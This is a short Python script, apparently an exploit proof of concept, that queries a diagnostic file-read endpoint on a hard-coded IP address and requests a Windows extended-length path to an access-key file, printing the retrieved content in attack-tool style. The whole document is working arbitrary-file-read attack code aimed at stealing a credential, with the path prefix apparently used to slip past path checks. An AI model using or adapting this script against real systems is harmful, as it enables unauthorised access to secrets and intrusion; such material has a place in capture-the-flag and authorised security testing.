import requests
import json

BASE_URL = "http://1.95.51.2:8080"

def get_key_content():
    path = r"\\?\C:\token\access_key.txt"
    url = f"{BASE_URL}/api/diag/read"
    params = {"path": path}
    try:
        r = requests.get(url, params=params, timeout=5)
        if r.status_code == 200:
            data = r.json()
            content = data.get("content")
            print(f"[+] Content Raw: {repr(content)}")
            return content
    except Exception as e:
        print(f"[!] Error: {e}")
        
if __name__ == "__main__":
    get_key_content()
